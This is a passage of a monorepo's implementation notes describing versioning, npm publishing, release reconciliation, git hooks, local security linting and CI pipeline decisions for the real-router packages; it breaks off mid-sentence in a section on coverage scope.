# Implementation Notes

> Non-obvious architectural decisions and infrastructure setup

## Project Rename

Project renamed from `router6` to `real-router`. Updated in:

- `package.json` (name, repository, bugs, homepage)
- `sonar-project.properties` (projectKey, projectName)
- `.changeset/config.json` (repo)
- `tsconfig.json` (paths: `router6*` → `@real-router/*`)
- `.github/workflows/release.yml` (repository name in comments)

### Directory Structure

Source directories renamed: `modules/` → `src/`. Updated in:

- `turbo.json` (inputs patterns)
- `tsconfig.json` (paths)
- All package.json files

## Versioning Strategy

### Independent Versioning

Each package has its own version. NOT using `fixed` mode in changesets (where all packages share the same version).

### Version Synchronization

Root `package.json` version is synced from `@real-router/core`:

```bash
pnpm version  # runs changeset version + sync + changelog aggregation
```

Scripts executed:

1. `changeset version` — updates package versions and changelogs
2. `.changeset/cap-major-bumps.mjs` — prevents accidental major bumps in pre-1.0 packages (caps at minor)
3. `.changeset/sync-version.mjs` — syncs root package.json version from core
4. `.changeset/aggregate-changelog.mjs` — aggregates package changelogs to root CHANGELOG.md

Root package is private and never published (cosmetic only).

### Changelog Aggregation

Root `CHANGELOG.md` is auto-populated from package changelogs:

```markdown
## [2026-01-24]

### @real-router/core@0.2.0

### Minor Changes

- Feature X

### @real-router/helpers@0.1.1

### Patch Changes

- Updated dependencies
```

**Features:**

- Runs after `changeset version`
- Only includes public packages (skips private)
- Includes ALL versions: initial releases, patches, dependency updates
- Incremental — only adds new entries (checks existing `### package@version`)
- Sorted by package name (alphabetical), then version (descending)
- Uses date-based sections (`## [YYYY-MM-DD]`)

**Script:** `.changeset/aggregate-changelog.mjs`

### Private Packages Versioning

`.changeset/config.json`:

```json
{
  "privatePackages": {
    "version": true, // Version private packages (route-tree, search-params, etc.)
    "tag": false // Don't publish to npm
  }
}
```

**Why?** Public packages depend on private packages. Changesets needs to update versions in lock step, but shouldn't try to publish private packages.

**Note:** `@real-router/types` (formerly `core-types`) is now a **public** package published to npm.

## Release Automation

### Workflow: `.github/workflows/changesets.yml`

**Trigger:** `workflow_run` — runs after `Post-Merge Build` workflow completes successfully on master.

**Flow:**

1. Developer runs `pnpm changeset` → creates `.changeset/*.md`
2. Push to master triggers `Post-Merge Build` workflow
3. Build passes → triggers changesets workflow
4. If changesets exist → creates/updates "Version Packages" PR (uses `PAT_TOKEN` to trigger CI on created PR)
5. Maintainer merges Release PR
6. Next CI pass on master → `pnpm changeset publish` publishes to npm + creates GitHub Releases via `gh release create`

**OIDC Trusted Publishing:**

- Uses npm's native OIDC (no NPM_TOKEN secret needed)
- Requires Node.js 24+ (npm >= 11.5.1)
- First publish must be manual (`pnpm publish`) - can't configure Trusted Publisher before package exists (pnpm 11 publishes natively; no npm CLI needed even for bootstrap)
- Trusted Publisher configured with workflow: `changesets.yml`

**Build optimization:** the release "Bundle packages for publish" step runs `pnpm turbo run bundle --filter='!./examples/**'` — dist artifacts only, no test gate. It deliberately does NOT run `turbo run build`: `build` `dependsOn` `test:stress`, and **no CI/post-merge job ever warms `test:stress`** (stress is pre-push-only — see "CI: test:stress lives only in pre-push"). So `turbo run build` at release cold-ran all ~23 `test:stress` tasks every publish (~3m of *guaranteed* cache misses — 156/179 hit, the 23 misses were exactly the 23 stress-test packages) plus a redundant full test re-run. The commit being published already passed the complete gate on its release-PR CI, and pre-push runs stress; the publish step only needs artifacts. `bundle` is a full cache hit off the post-merge build of the same commit. (An earlier version of this note claimed `build:dist-only` + `test`; that task never existed and the workflow actually ran bare `build` — corrected here.)

### Critical: Use `pnpm publish` NOT `npm publish`

**Problem discovered (Issue #18):** `npm publish` does NOT convert `workspace:^` protocol to actual versions. Packages were published with literal `"@real-router/logger": "workspace:^"` in dependencies, causing `npm install` to fail.

**Solution:** Use `pnpm publish` which:

1. Converts `workspace:^` → `^0.2.0` (actual version)
2. Internally calls `npm publish` (OIDC works)

```bash
# ❌ WRONG - publishes with workspace:^
npm publish --provenance --access public

# ✅ CORRECT - converts workspace protocol
pnpm publish --provenance --access public --no-git-checks
```

**Sources:**

- [pnpm workspaces docs](https://pnpm.io/workspaces) — workspace protocol conversion
- [pnpm/pnpm#9812](https://github.com/pnpm/pnpm/issues/9812) — "pnpm publish runs npm publish under the hood"

### Publish Order in changesets.yml

`pnpm changeset publish` handles dependency-ordered publishing automatically. It:

- Checks which versions are not on npm
- Publishes in dependency order
- Skips already published (warns, doesn't fail)
- Creates git tags (with fallback for silent tag failures — see [changesets#1621](https://github.com/changesets/changesets/issues/1621))
- Uses `pnpm publish` internally (detects from lockfile, OIDC works)

### TypeScript Declarations Generation

**Problem (Issue #21):** `dts-bundle-generator` inlined ALL types into each package's `.d.ts` file, making `Router` from `@real-router/core` and `Router` from `@real-router/browser-plugin` structurally identical but nominally different types:

```typescript
router.usePlugin(browserPluginFactory()); // ❌ TypeScript Error
// Type 'PluginFactory<object>' is not assignable to type 'PluginFactory<object>'
```

**Solution:** Publish `@real-router/types` as a standalone public package. All packages import types from it.

**JS bundling:** tsdown with `deps.alwaysBundle` option bundles private packages:

```typescript
// packages/core/tsdown.config.mts
export default createIsomorphicConfig({
  deps: {
    alwaysBundle: ["event-emitter", "route-tree"],
  },
});
```

**DTS generation:** tsdown with `dts: true` generates type declarations and automatically resolves types from bundled dependencies.

**Results:**

| Metric               | Before | After | Change |
| -------------------- | ------ | ----- | ------ |
| Total .d.ts lines    | 12,080 | 3,793 | -69%   |
| core .d.ts           | 1,807  | 216   | -88%   |
| browser-plugin .d.ts | 1,831  | 500   | -73%   |
| react .d.ts          | 1,813  | 80    | -96%   |

This approach ensures:

- Types are not duplicated across packages
- Module augmentation works correctly
- Type compatibility between packages (same type identity)

**Removed:** `dts-bundle-generator` and `scripts/generate-dts.mjs` are no longer used.

**GitHub Releases:**
Per-package releases — every published package tag gets its own GitHub release via `gh release create`:

- Tag format: `{package-name}@{version}` (e.g., `@real-router/core@0.2.0`)
- Release notes extracted from that **version's** `## <version>` section of the package's `CHANGELOG.md`
- Skips if release already exists (idempotent — existing releases fetched once via `gh release list`)
- Two-pass creation: dep-bump-only releases first (sink to bottom on GitHub), then featured releases with actual code changes (float to top)
- Reconciled on **every** run, tag-driven (not gated on "did we publish this run") — see "Idempotent GitHub-Release reconciliation (#731)" below

### Idempotent GitHub-Release reconciliation (#731)

**Problem.** The release pipeline was **not idempotent across runs**. `Create GitHub Releases` was gated `if: steps.unpublished.outputs.has_unpublished == 'true'` and iterated *current* `packages/*/` versions. When that step failed once (observed: run 27213292219, `exit 128`, no diagnostics — the `run:` had no `set -euo pipefail`/tracing), the packages were already on npm with tags pushed, so the **next** run saw `local == npm` → `has_unpublished=false` → the entire publish/release branch was skipped → the missing releases were never recreated. The 0.56.0 batch shipped to npm with 15/16 GitHub Releases missing, recoverable only by hand. A second latent path: `concurrency.cancel-in-progress: true` could cancel a run between `npm publish` and tag/release creation.

**Solution.** Three changes in `changesets.yml`:

1. **Replaced `Create GitHub Releases` with `Reconcile GitHub Releases`** — gated only on `changesets_count == '0'` (the publish branch), **not** on `has_unpublished`, so it runs on every publish-path invocation including no-op ones. It is **tag-driven**: enumerate `git tag -l '*@*'`, skip any tag already in the one-shot `gh release list` set, and create the rest. This both creates this run's releases *and* backfills any an earlier failed run dropped. Per-version notes come from the `## <version>` CHANGELOG section (not the file's top section, so backfilled older tags get correct notes). `--verify-tag` ensures it attaches to the existing remote tag and never mints a new one.
2. **`set -euo pipefail` + `::group::` tracing** so a failure is diagnosable (the original `exit 128` was not). `gh release list` failure is fail-fast, not silently "treat all tags as missing".
3. **`concurrency.cancel-in-progress: false`** — serialize publishing, never cancel a run mid-`changeset publish`.

**Why tag-driven, not current-version.** Iterating current `packages/*/` versions only reconciles the latest batch; if a release is missed and then a *newer* version is published before the next reconcile, the older miss is orphaned forever. Enumerating tags closes that gap. Cost is bounded by fetching the full release set in a single `gh release list --limit 1000` call (800+ tags exist — a per-tag `gh release view` sweep would be 800+ API calls) and a late per-candidate `gh release view` guard only for the few that look missing.

**Verified** (dry-run of the exact reconcile shell against the live repo, `gh release create` stubbed): on the real tag set it flags exactly the genuine gaps — e.g. it surfaced `@real-router/ssr-data-plugin@0.3.4` (tag present, Release absent) with correct notes, while skipping all 864 existing releases; the two-pass ordering and per-version notes/`--prerelease` detection were confirmed against `@real-router/core@0.56.0` (featured, 36-line notes) vs `@real-router/sources@0.8.5` (dep-only, 4-line notes). `actionlint` on the workflow: no new findings.

### SonarCloud Version

The `sonarcloud` job inside `.github/workflows/ci.yml` (consolidated from the former standalone `sonarcloud.yml`) gets version dynamically:

```yaml
- id: version
  run: |
    VERSION=$(node -p 'require("./packages/core/package.json").version')
    echo "version=$VERSION" >> $GITHUB_OUTPUT

- name: SonarCloud Scan
  uses: SonarSource/sonarqube-scan-action@... # v7
  with:
    args: >
      -Dsonar.projectVersion=${{ steps.version.outputs.version }}
```

This ensures SonarCloud shows correct version without manual updates.

## Git Hooks

### Commit Message Validation

`.husky/commit-msg`:

```bash
pnpm commitlint --edit "$1"
```

Enforces conventional commits. Types and scopes defined in `commitlint.config.mjs`.

### Pre-commit

`.husky/pre-commit` runs (correctness validation, fast — <2 min on a typical commit):

- **Auto-dedupe** — if `pnpm-lock.yaml` is staged, runs `pnpm dedupe` and re-stages the lockfile. This eliminates manual `pnpm dedupe` runs after dependency updates ([pnpm/pnpm#7258](https://github.com/pnpm/pnpm/issues/7258) — no auto-dedupe setting exists in pnpm 10)
- `pnpm lint:deps` (syncpack — workspace version consistency, ~1s static scan)
- `pnpm turbo run test --filter='!./examples/**'` (includes type-check and lint via turbo task graph, excludes examples)
- `pnpm lint:e2e` (verifies example e2e directories have spec files)

### Pre-push

`.husky/pre-push` runs (artifact validation, NOT a superset of pre-commit):

- `pnpm lint:duplicates` (jscpd — copy-paste detection across the full tree)
- `pnpm turbo run build lint:package lint:types --filter='!./examples/**'` (full build + validate package.json exports via publint + validate `.d.ts` via arethetypeswrong)
- `pnpm lint:unused` (knip — dead code detection across the full tree)
- `pnpm lint:deps` (syncpack — final gate before the push reaches the remote)
- `pnpm lint:audit` (osv-scanner — vulnerability scan against the GHSA database; non-blocking if the binary is missing locally)
- `pnpm lint:security` (semgrep — diff-aware SAST over shipped `src`; fast local complement to cloud CodeQL; non-blocking if the binary is missing locally — see "Local SAST" below)

**Rationale:** Pre-commit validates correctness in <2 min so it stays painless on every commit. Pre-push validates artifacts (full build pipeline + dist surface area + dep consistency + GHSA audit) — slower, runs once per push. `lint:deps` lives in **both** layers: pre-commit catches workspace version drift the moment a `package.json` is staged (~1s static check), pre-push acts as the final gate. `lint:package`/`lint:types`/`lint:unused` **also run in CI** now (#813 — see below); only `lint:duplicates`' hard threshold stays pre-push-only (CI keeps an informational jscpd SARIF channel). `lint:audit` was added after PR #643 (see "Local Dependency Audit" below) so contributors can catch CVEs locally before CI Dependency Review flags them.

The full build orchestrator (`pnpm turbo run build`) is wired in `turbo.json` to depend on `bundle`, `test`, `test:properties`, AND `test:stress` — so pre-push exercises stress tests for every human push. Stress coverage is intentionally **not** duplicated in CI workflows (see "CI: `test:stress` lives only in pre-push" below).

#### Local SAST: semgrep diff scan + eslint-plugin-security

**Problem.** Security findings (e.g. the `js/incomplete-multi-character-sanitization` CodeQL alert on `validateRoutePath`) surfaced only in **cloud CodeQL**, after pushing and opening a PR — a slow feedback loop, and CodeQL's interprocedural taint engine is far too heavy (minutes of DB build) to run on pre-push. There was no fast, local SAST layer to catch the common classes before they reached CI.

**Solution.** Two complementary local layers, mirroring the existing "external tool, non-blocking if absent" pattern of `lint:audit`:

1. **`eslint-plugin-security`** (`eslint.config.mjs`, **shipped `src` only**) — in-process, zero marginal cost (runs in the existing `lint` pass, already in the pre-push build graph). High-signal rules stay ON (`detect-unsafe-regex`, `detect-eval-with-expression`, `detect-child-process`, `detect-pseudoRandomBytes`, …). Three rules are OFF as **structural** false positives for a view-layer router: `detect-object-injection` (fires on every `obj[key]`), `detect-non-literal-regexp` (the matcher builds RegExps from trusted route *config*, not user input), `detect-possible-timing-attacks` (no secret comparison exists). One verified-safe `detect-unsafe-regex` hit (`FULL_ROUTE_PATTERN` — a `.`-anchored nested `*` with disjoint classes, no backtracking) is suppressed inline with justification, keeping the rule active everywhere else.
2. **`scripts/check-semgrep.sh`** (`pnpm lint:security`, pre-push) — semgrep over `packages/**/src`, **diff-aware** via `--baseline-commit $(git merge-base origin/master HEAD)` so only findings **introduced by the branch** can block (a legacy finding never blocks an unrelated push). Rulesets: `p/javascript` (registry breadth, cached after first fetch) + `.semgrep/rules.yml` (local custom rules, incl. an `incomplete-multi-character-sanitization` rule that mirrors the exact CodeQL alert, network-independent). Resolves a runner (`semgrep`, else `uvx semgrep`); **skips gracefully** if neither is present. Findings (exit 1) block; tool/network errors (exit ≥2) only warn.

**Why this split.** No free tool is both as deep as CodeQL *and* pre-push-fast: CodeQL's depth comes from its compiled DB. So CodeQL stays the authoritative gate in CI; the local layers are **shift-left** convenience — pattern-based (eslint-security) + AST-based diff scan (semgrep) catch the common, recognizable classes (including the one that fired here) seconds after editing, while genuinely deep taint analysis remains in CI. Both local layers are non-blocking when their tool is absent, matching `lint:audit` — fresh clones and `--no-verify`/automerge pushes are never wedged, and CI CodeQL still runs.

#### CI parity for publint / attw / knip (#813)

**Problem:** publint (`lint:package`), attw (`lint:types`), and knip (`lint:unused`) existed **only** in `.husky/pre-push` — `grep` over `.github/workflows/` found them only in comments. Pre-push is routinely bypassed: **Dependabot automerge** (the bot pushes hookless; automerge gates only on `CI Result` + changeset checks — a standing weekly PR stream), `git push --no-verify`, and web edits. So a dep/build bump that broke a package's export map, `.d.ts` resolution, or introduced an unused graph merged **green** — "green CI" did not mean "publishable" (smoke only resolves exports, not tarball/type structure).

**Solution:** two steps added to the `pipeline` job in `ci.yml`:

- `Validate published artifacts (publint + attw)` — `pnpm turbo run lint:package lint:types` with the **same affected filter** as the Bundle step; gated on `steps.artifacts.outputs.built == 'true'`. Both tasks `dependsOn bundle`, already run above → cache hit, seconds.
- `Check for unused code` — `pnpm lint:unused` (knip), **unconditional** (pure source-graph analysis, no dist), beside the other cheap lints. Catches unused even on PRs the affected filter scored as "nothing built".

Both fold into the required `CI Result` (they're steps in `pipeline`).

**Coverage is not "every public package" — don't read this as "green CI = publishable".** `lint:package`/`lint:types` are per-package scripts, so turbo only runs them where they're defined; it silently skips packages that lack them. This commit added the scripts to `logger` and `route-utils` (both ordinary tsdown builds, both already on npm — they were a genuine gap). Three published packages remain **out of scope, by build format**: `angular` (ng-packagr → FESM2022, partial-Ivy — publint/attw aren't wired for that layout) and `svelte` (svelte-package output) ship non-tsdown artifacts; `core-types` is types-only. Their tarball/type validity is covered by their own build tooling, not by this gate. If a future package adds a tsdown build, add the two scripts (there is no auto-enrolment).

**Why not jscpd too:** the hard 2% duplication threshold deliberately stays in the hook; CI keeps the **informational** jscpd SARIF job (`-t 100`, exit 0) — a conscious choice from the prior audit (see "jscpd …SARIF" below), so duplication is visible as PR annotations without gating merges.

### jscpd 5.x renamed the config `ignore` key to `ignorePattern` (#714)

**Problem:** `pnpm lint:duplicates` (the pre-push copy-paste gate) started failing at **6.9%** over the 2% threshold, flagging clones that `.jscpd.json` was supposed to exclude — `packages/preact/src/**` (the deliberate React↔Preact parallel structure), `packages/*/src/dom-utils/**` (the Angular git-tracked copy vs the `dom-utils` package), `packages/hash-plugin/src/**`, the `*.react-server.ts` shims, etc. The `ignore` array in `.jscpd.json` listed every one of them, yet they all still counted.

**Root cause:** jscpd was bumped to **5.x**, a ground-up **Rust rewrite** (`cpd`). It still reads `threshold`, `minLines`, `minTokens`, and `format` from `.jscpd.json` under their old names (verified by toggling each against 5.0.4) — but the exclusion list key was **renamed `ignore` → `ignorePattern`** (matching the new CLI flag `--ignore-pattern`). The old `ignore` array is silently not read, so every exclusion evaporated with no error: the threshold kept being applied (hence the failure cited 2.0%), only the filter went missing. The duplication had not grown; the key name had changed underneath the config.

**Solution:** Rename the key in `.jscpd.json` from `ignore` to `ignorePattern` — the exclusions stay in the config (single source of truth), and `lint:duplicates` remains the plain `jscpd packages/*/src/`. Verified empirically against jscpd 5.0.4: a config with `ignorePattern` excludes the listed globs (1.0%, gate green); the same list under `ignore` does not. The schemastore `$schema` (old config shape) is dropped, and an inline `_comment` records the rename. (An earlier fix moved the list to the `-i` CLI flag in the script — that also works, but splitting the exclusions out of the config was unnecessary; the key rename is the minimal correct fix.)

**Why not refactor the flagged code:** the largest "clones" are intentional — the Angular `dom-utils` copy is a build-time materialization of `shared/dom-utils/` (ng-packagr can't follow the symlink), and the React/Preact components are deliberately independent per-framework twins. The duplication is by design; the filter is what regressed.

### jscpd 5.0.9 re-renamed the config keys again — `ignorePattern` → `ignore`, `skipComments` → `mode` (#831)

**Problem:** the `jscpd` 5.0.4 → 5.0.9 bump in the dev-dependencies group (#831) re-broke the pre-push duplication gate: `pnpm lint:duplicates` failed at **6.84%** over 2%, again counting the deliberately-excluded clones (`packages/preact/src/**`, etc.) that `.jscpd.json`'s `ignorePattern` list named. jscpd also began emitting `config file .jscpd.json: unknown field '_comment'` and `unknown field 'skipComments'` warnings.

**Root cause:** the Rust `cpd` rewrite reshuffled its option vocabulary *again* between 5.0.4 and 5.0.9 (verified against the installed 5.0.9 `--help`):
- **File-level glob ignore moved back to `ignore`** (`-i, --ignore` — "File-level glob patterns to ignore"). `ignorePattern` was **reassigned** to a *different* feature: `--ignore-pattern` is now "Code-level regex patterns to skip matching tokens" (e.g. `//\s*cpd-disable`). So our `ignorePattern: [globs]` was silently reinterpreted as token-regexes that match no code → every file exclusion evaporated (same failure mode as #714, opposite key).
- **`skipComments` is gone**, replaced by `--skip-comments` = "Alias for `--mode weak`". The config key is now `mode` (`mild | weak | strict`).
- `_comment` is rejected as an unknown field (5.0.9 validates the config shape and warns on anything it doesn't recognize), so the inline doc-comment had to leave the file.

**Solution:** in `.jscpd.json`, rename `ignorePattern` → `ignore` (the exclusion list is unchanged), replace `skipComments: true` → `mode: "weak"`, and drop the `_comment` field (this note is its replacement). Verified empirically against jscpd 5.0.9: gate is green at **0.98%** with zero "unknown field" warnings; preact/hash-plugin/etc. are excluded as intended. `threshold`, `minLines`, `minTokens`, `reporters`, `format`, `absolute`, `gitignore` are still read under their existing names. This fix ships **with** the 5.0.9 bump in the same PR — a linter bump that changes its own config contract must carry the matching config change (CLAUDE.md: "a lint failure from a linter-plugin bump itself is a code/config fix"). CI is unaffected either way (the blocking gate is pre-push-only; CI's jscpd SARIF job runs `-t 100` and stays informational).

**Lesson:** jscpd 5.x config keys are unstable across patch releases (`ignore` → `ignorePattern` in #714 at 5.0.4, back to `ignore` in #831 at 5.0.9). Pin jscpd exactly (`save-exact`) and re-verify the ignore list actually excludes after any jscpd bump — a green-looking config can silently stop filtering.

### jscpd: `--no-tips` + non-blocking SARIF in CI

**Two jscpd 5.x features adopted (the only ones worth it for this repo):**

1. **`--no-tips`** on `lint:duplicates` — the 5.x binary prints promo lines ("Gangsta Agents…", "Support jscpd → opencollective…") after every run; `--no-tips` suppresses them so the pre-push gate output stays clean.

2. **Non-blocking SARIF in CI** (the `Code Duplication (SARIF)` job in `ci.yml`). jscpd used to run **only** in the pre-push hook, so duplication was invisible in PRs. The new job runs `pnpm lint:duplicates:sarif` (`jscpd … --no-tips -t 100 -r sarif -o jscpd-report`) and uploads the report via `github/codeql-action/upload-sarif` — duplication then shows up as **PR annotations + Security-tab entries** without gating the merge. Two deliberate choices keep it informational:
   - `-t 100` makes jscpd itself always exit 0 (the threshold check is the pre-push hook's job, not CI's), so the step is genuinely green.
   - The job is **not** in the `ci` gate's `needs` (`[check, pipeline, smoke, sonarcloud]`), so even an upload hiccup can't block a merge. Requires `permissions: security-events: write`.

   The **hard** 2%-threshold gate still lives only in the pre-push hook (`pnpm lint:duplicates`) — CI gains visibility, not a new blocker.

**Rejected 5.x features** (no real value here): `--blame`, `badge`/`markdown` reporters, `--workers` (already ~100 ms), `--max-size`, `--mode`, `--min-duplicated-lines`. `--skip-local` (drops same-directory clones, 7→5 on our tree) was left out pending a look at which clones it hides.

## Commit Conventions

### Scope Sync

`commitlint.config.mjs` is the single source of truth for commit types and scopes:

```javascript
// commitlint.config.mjs
export const TYPES = ["feat", "fix", "docs", ...];
export const SCOPES = ["core", "logger", "browser-plugin", ...];

// cz.config.js imports from commitlint
import { TYPES, SCOPES } from "./commitlint.config.mjs";
```

To add a new scope, edit only `commitlint.config.mjs`.

### Release Type

Added `release` type for release commits:

```javascript
{ value: "release", name: "release:  Release commit" }
```

### Empty Scope Allowed

```javascript
"scope-empty": [0]  // Allow commits without scope
```

## CI Pipeline

### Single Pipeline Architecture

`.github/workflows/ci.yml` — single workflow with a unified `Pipeline` job that replaces the former parallel Lint & Type Check + Test + Build jobs. Downstream jobs: Coverage (Codecov), SonarCloud, Bundle Size, Package Smoke Test. Gate job: "CI Result" (single required status check).

Pipeline runs two turbo invocations in one VM:

1. `turbo run test test:properties test:stress -- --coverage` — full validation (type-check → lint → test), vitest receives `--coverage` via turbo passthrough
2. `turbo run bundle` — only tsdown/rollup/svelte-package, deps cached from step 1

**Why not parallel jobs:** Parallel lint and test jobs caused a turbo remote cache race condition — both ran `type-check` simultaneously, neither could read the other's cache. Merging into one job eliminates the race and saves one VM's billing time.

**Why two turbo invocations:** `turbo run build -- --coverage` passes `--coverage` to `build` scripts (tsdown), not to `test` scripts (vitest). Separate invocations ensure vitest gets `--coverage` and bundle step gets cache hits from step 1.

### Package Smoke Test

CI job `smoke` (added after #413 and #418): packs all 24 public packages into tarballs, installs them into an isolated temp project via `npm install`, and verifies every export resolves with `import()`.

**Script:** `scripts/smoke-test-packages.sh`

**Catches:**

- Private packages leaking into dependencies (#413 — `dom-utils` in published deps)
- Broken export paths, missing dist files

**Skipped packages** (cannot be imported in plain Node.js):

- `@real-router/types` — types-only package, no runtime exports
- `@real-router/solid` — solid-js runtime requires browser/DOM environment
- `@real-router/svelte` — `.svelte` files require Svelte compiler

These packages are verified as installed (directory exists) but not imported.

Node.js 24 only (no matrix). Runs on `ubuntu-latest`.

### Incremental Builds with --filter

CI uses turbo `--filter` with git diff syntax for incremental builds:

```yaml
# Pipeline job — two turbo invocations:
pnpm turbo run test test:properties test:stress --filter='...[$TURBO_BASE]' --filter='!./examples/**' -- --coverage
pnpm turbo run bundle --filter='...[$TURBO_BASE]' --filter='!./examples/**'

# Smoke job — all packages, cache from pipeline:
pnpm turbo run bundle --filter='./packages/*'
```

`$TURBO_BASE` is computed by the `check` job: `github.event.before` for push events, `origin/master` for PRs.

**Why not `--affected`:** Turbo does not allow `--affected` with `--filter`. The `--filter='!./examples/**'` exclusion is required — without it, ~90 example apps run their lint/test/build, adding ~20 minutes to CI. The `...[ref]` syntax provides equivalent git-diff filtering while allowing combination with exclusion filters.

**Check job:** Pre-filters by changed files (skips CI for docs-only changes, skips for `changeset-release/*` PRs). Computes `turbo_base` as a job output consumed by all downstream jobs.

### Concurrency

All workflows use concurrency control:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

Cancels in-progress runs when new commit pushed.

### CI: `test:stress` lives only in pre-push

**Problem.** A full PR rebuild used to take ~28 min (measured on PR #651, sha=06adf39b parent, lockfile-bump scenario where every package was cache-missed). The `test:stress` stage contributed ~5 min of that budget across ~17 stress tasks (one per package with reactive subscriptions or async pipelines). The signal-to-cost ratio is bad: stress tests catch leak/race-condition regressions that virtually never originate in PR diffs — they appear when a framework adapter's dependency (React/Vue/Solid/Svelte) bumps and changes cleanup semantics, or when a new plugin is introduced.

**Solution (commits `06adf39b`, `d2fbfa4a`).** Drop `test:stress` from both CI workflows that previously ran it:

- `ci.yml` "Test with coverage" step: `pnpm turbo run test test:properties test:stress …` → `pnpm turbo run test test:properties …`
- `post-merge.yml` "Build" step: `pnpm turbo run build …` → `pnpm turbo run bundle test test:properties …` (avoids the `build` orchestrator dependency on `test:stress` declared in `turbo.json`)

The `build` task in `turbo.json` still lists `test:stress` in its `dependsOn` — so anyone running `pnpm build` locally (and the **pre-push hook**, which does exactly that) continues to exercise the full stress suite. Stress coverage is preserved for every human push.

Post-removal numbers:

| Workflow             | Before        | After                 |
| -------------------- | ------------- | --------------------- |
| PR CI full rebuild   | ~28 min       | **~22–23 min**        |
| Post-Merge Build full rebuild | ~25 min | **~18–20 min**       |
| Cache hit (any)      | unchanged     | unchanged (~1–5 min)  |

**Why this is safe enough.** Pre-push covers stress for every human push. Dependabot PRs bypass pre-push (the bot pushes directly to its fork), so framework-adapter bumps (React/Vue/Solid/Svelte) lose their stress safety net here — a deliberate trade-off, on the bet that adapter bumps are rare and locally re-runnable when a leak is suspected.

**How to undo.** Re-add `test:stress` to either `ci.yml`'s "Test with coverage" step or to `post-merge.yml`'s explicit task list, and the orchestration kicks back in. Both workflows carry inline comments pointing at this rationale so the trade-off is rediscoverable.

### CI: artifact-gated downstream jobs (config-only PRs don't fail Coverage/Sonar/Bundle Size)

**Problem.** A PR that changes only **root config/docs that aren't packages** (e.g. the `lint:duplicates` script in `package.json`, `.jscpd.json`) failed four checks — Bundle Size, Coverage (Codecov), SonarCloud, and the **CI Result** gate — with `Unable to download artifact(s): Artifact not found for name: dist / coverage-reports`.

Two heuristics disagreed. The `check` job's "is this a code change?" filter only excludes `.github/**` and `*.md`, so a `package.json`/`.jscpd.json` edit sets `should_run=true`. But `pipeline`'s test/bundle steps use turbo's affected filter `--filter='...[origin/master]'`, which selects **zero** packages for a root-config change — so nothing is built or tested, and `packages/*/dist/` + `packages/*/coverage/` never exist. The upload steps produced no artifact, and the downstream consumers (`coverage`, `sonarcloud`, `bundle-size`) hard-failed on the missing download. `sonarcloud` is in the `ci` gate's `needs`, so its failure failed the single required **CI Result** check and blocked the PR.

**Solution.** `pipeline` now emits a `built` output, set by a "Detect produced artifacts" step (`id: artifacts`) that checks whether any real artifact **file** exists post-bundle. The two upload steps gate on the step-local `steps.artifacts.outputs.built == 'true'`; the three downstream artifact-consuming jobs (`coverage`, `sonarcloud`, `bundle-size`) gate on the job output `needs.pipeline.outputs.built == 'true'`. On a zero-affected PR they **skip** instead of failing; the `ci` gate already treats `skipped` as a pass (`ok() { [[ "$1" == "success" || "$1" == "skipped" ]]; }`), so CI Result goes green. A real source change still produces `dist/coverage` → `built=true` → the jobs run normally, including their fill-in-from-cache logic for non-affected packages.

**Why not widen the `check` filter instead.** Excluding `package.json` from the `should_run` heuristic is unsafe — a root `package.json` dependency/override bump genuinely affects every package's build and must run full CI. Gating on *artifacts actually produced* is the precise signal; it can't false-negative a real source change.

**Follow-up (#730): gate on files, not directories.** The first implementation computed `built` from **directory** existence (`shopt -s nullglob; produced=(packages/*/dist packages/*/coverage)`). That re-opened the exact failure it was meant to prevent: on a config-only PR (e.g. `.jscpd.json`) turbo affects zero packages, yet empty `packages/*/dist` / `packages/*/coverage` directories can still be present, so the glob set was non-empty → `built=true`, while `upload-artifact` (which requires files *inside* the path) uploaded nothing → `coverage`/`sonarcloud`/`bundle-size` failed on `Artifact not found` and the required CI Result gate blocked the PR (observed: runs 27182816369, 27162256870). Fixed by gating on a real file:

```bash
produced="$(find packages \( -path '*/coverage/lcov.info' -o -path '*/dist/*' \) -type f -print -quit)"
[ -n "$produced" ] && built=true || built=false
```

The grouping parens `\( … \)` are **load-bearing**: `find … -path A -o -path B -type f -print` binds as `A OR (B AND -type f AND -print)` (implicit `-a` outranks `-o`), so a `coverage/lcov.info` match on branch `A` would carry no action and never print — the group applies `-type f -print -quit` to *both* branches. `-quit` stops at the first hit (cheap). Because any non-empty affected set runs `test` (→ `lcov.info`) **and** `bundle` (→ `dist/`) under the same `...[base]` filter, the OR is safe — both artifacts are always present together, never one without the other.

### pnpm/action-setup v6

All CI workflows use `pnpm/action-setup@v6` (`ci.yml`, `changesets.yml`, `danger.yml`, `post-merge.yml`, `examples.yml`, `codeql.yml`). v5 introduced auto-detection of pnpm version from the `packageManager` field in root `package.json` — no explicit `version` input needed; v6 preserved this behavior.

### Workflows

| Workflow             | File                       | Purpose                                                                           |
| -------------------- | -------------------------- | --------------------------------------------------------------------------------- |
| CI                   | `ci.yml`                   | Single Pipeline job on PRs: test + bundle, then smoke test, coverage, bundle size |
| Post-Merge Build     | `post-merge.yml`           | Build-only verification on master push                                            |
| Changesets           | `changesets.yml`           | Versioning and npm publish (triggered by Post-Merge Build success)                |
| Changeset Check      | `changeset-check.yml`      | Validate changesets on PRs (format, references)                                   |
| CodeQL               | `codeql.yml`               | Security scanning + dependency audit                                              |
| Dependabot Automerge | `dependabot-automerge.yml` | Auto-merge patch/minor updates                                                    |
| Danger               | `danger.yml`               | Automated PR review checks                                                        |
| Examples             | `examples.yml`             | Scheduled e2e tests for example apps (Mon & Thu)                                  |

**Removed:** `build.yml`, `sonarcloud.yml`, `coverage.yml`, `size.yml`, `release.yml` (consolidated into `ci.yml` and `changesets.yml`)

### Coverage scope is generated, not hardcoded (#732)

**Problem.** The external quality gates' scope lived in three hand-maintained lists that were never
updated as packages were added: Codecov's `files:` in `ci.yml` (16 stale paths, several *private*),
`codecov.yml` `flags:` (17), and `sonar-project.properties` `sonar.sources` (11). Result: of 25
published packages, Codecov saw 16 and Sonar 11 — ~14 public packages (all adapters except React,
half the plugins) were in **neither**, so their coverage regressions went uncaught by Codecov/Sonar.
(Coverage was still *enforced* per-package by vitest thresholds in the `pipeline` job — the gap was
external-gate **visibility**, not enforcement.)

**Solution.** Generate the scope from the filesystem; keep `sonar-project.properties` for stable
policy only. **One source of truth:** `scripts/check-coverage-scope.mjs` both *guards* the static
config (check mode, below) and *generates* the CI scope (`--emit` mode prints `sources=`/`tests=`/
`reports=` lines for `$GITHUB_OUTPUT`) — the same filesystem walk feeds both, so the CI scope and
